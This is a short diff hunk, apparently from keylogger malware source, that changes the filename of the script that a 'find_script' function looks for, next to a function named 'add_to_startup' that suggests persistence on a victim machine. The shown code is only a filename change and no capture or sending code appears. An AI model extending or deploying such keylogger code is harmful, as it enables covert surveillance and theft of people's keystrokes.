@@ -133,7 +133,7 @@ def add_to_startup():
 
 def find_script():
     # Define the filename of your script
-    script_filename = 'keylogger-server.py'
+    script_filename = 'keylogger.py'
 
     # Define the directories to search for the script
     search_directories = [
